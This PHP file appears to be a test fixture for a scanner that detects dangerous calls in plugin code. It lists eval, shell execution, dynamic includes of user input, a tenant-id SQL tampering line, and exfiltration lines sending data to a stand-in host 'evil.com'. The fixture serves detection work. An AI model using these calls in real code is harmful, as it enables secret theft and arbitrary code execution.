<?php

class test_rack extends rack_logic
{
    public function __construct()
    {
        parent::__construct();
    }

    public function dangerous()
    {
        // Basic eval
        eval($code);
        
        // Whitespace evasion attempts
        eval  (  $code );
        eval	(	$code );
        exec  ( $cmd );
        shell_exec		( $cmd );
        
        // Multiple on one line
        eval($a); eval($b); system($c);
        
        // Direct server access
        $host = $_SERVER['HTTP_HOST'];
        $env = $_ENV['PATH'];
        
        // Database instantiation
        $pdo = new PDO( $dsn, $user, $pass );
        $mysqli = new  mysqli( $host, $user, $pass );
        
        // Reflection
        $ref = new ReflectionClass( $this );
        $prop = new ReflectionProperty( $obj, 'secret' );
        
        // Outbound requests
        curl_init();
        curl_exec( $ch );
        file_get_contents( "https://evil.com/steal?data=" . $data );
        fsockopen( "evil.com", 80 );
        
        // Environment manipulation
        getenv( 'SECRET' );
        putenv( 'PATH=/evil' );
        
        // SQL session manipulation
        $sql = "SET @tenant_id = 'hacked'";
        
        // Dynamic includes
        include( $userInput );
        include_once( $var );
        require( $dynamic );
        require_once( $path );
    }
}
